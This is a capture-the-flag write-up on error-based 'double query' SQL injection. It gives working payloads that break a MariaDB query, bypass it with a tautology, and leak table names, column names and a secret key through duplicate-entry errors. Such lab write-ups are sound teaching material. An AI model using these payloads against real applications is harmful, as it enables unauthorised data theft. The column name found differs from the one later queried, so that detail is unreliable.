## Challenge - 5

This challenge is based on double query injection and we have to use AND in this injection

reference:

http://www.securitytube.net/video/4283

http://www.securitytube.net/video/4303



### Initial Analysis

First we have to find out how the developer has given the query so we try giving id the value. We can break query using '`\`' Which will give an error

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''\' LIMIT 0,1' at line 1
```

From this we can assume that the query is like:

```sql
select login_name,password from table_name where id='input' 
```

We can check this using id=

```sql
0' or 1=1 --+
```

which will give us a login id and password. 

In here the query will not dump anything we give it. It will only dump the login_name and password in the table or the error statement. 

Now we have to dump the secret key through the error

```sql
select count(*),concat(0x3a,(select database()),0x3a,floor(rand()*2))a from information_schema.columns group by a;
```

This query will give us an error due to a duplication caused by the randomness of the rand() function. It will dump the database name in the error or anything we give in it's place.

We can use the same method to get the table_name,column_name and secret key

### Solving

We can get the table name using: id=

```sql
1' AND (select 1 from(select count(*),concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,floor(rand()*2))a from information_schema.tables group by a)b); --+
```

It will give the error:

```
Duplicate entry ':8u4mpftsm8:0' for key 'group_key'
```

From which we get table_name = **8u4mpftsm8**

Now we can get the column name using: id=

```sql
1' AND (select 1 from(select count(*),concat(0x3a,(select column_name from information_schema.columns where table_name='8u4mpftsm8' limit 2,1),0x3a,floor(rand()*2))a from information_schema.tables group by a)b); --+
```


Which will give the error:

Which will give the error:

```
Duplicate entry ':secret_5SO5:0' for key 'group_key'
```

From which we will get column_name = **secret_5SO5**

Now we can get the secret key using : id=

```sql
1' AND (select 1 from(select count(*),concat(0x3a,(select secret_9O5W from 8u4mpftsm8),0x3a,floor(rand()*2))a from information_schema.tables group by a)b); --+
```

Which will give the error:

```
Duplicate entry ':Seu3ERzUbdGJm8cmLpUXpxkE:0' for key 'group_key'
```

where the key is :

**Seu3ERzUbdGJm8cmLpUXpxkE**